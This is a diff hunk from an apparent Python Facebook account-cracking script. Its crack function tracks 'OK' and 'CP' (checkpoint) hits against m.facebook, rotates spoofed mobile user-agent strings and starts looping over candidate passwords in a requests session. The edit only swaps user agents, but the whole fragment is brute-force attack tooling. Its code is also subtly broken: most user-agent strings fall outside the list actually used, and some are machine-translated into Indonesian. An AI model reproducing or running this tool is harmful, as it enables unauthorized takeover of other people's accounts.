@@ -583,15 +583,15 @@ def crack(idf,pwv):
 	sys.stdout.write(f"\rm.facebook {P}{loop}{P}/{P}{len(id)}{P} OK {H}{ok}{P} CP {k}{cp}{x} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
 	ua = random.choice(['Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'])
-	'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 SznProhlizec/9.0.2a'
-	'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro Build/QKQ1.190915.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 SessionId/'
+	'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36'
 	'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36'
 	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36'
-	'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/106.0.5216.6 Mobile Safari/537.36 TwitterAndroid'
-	'Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
-	'Mozilla/5.0 (Linux; Android 10; XIAOMI Mi Note 10 Lite Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/2.22.0'
-	'Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 [FB_IAB/FB4A;FBAV/387.0 .0.24.102;]'
-	'Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
+	'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N976B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36'
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
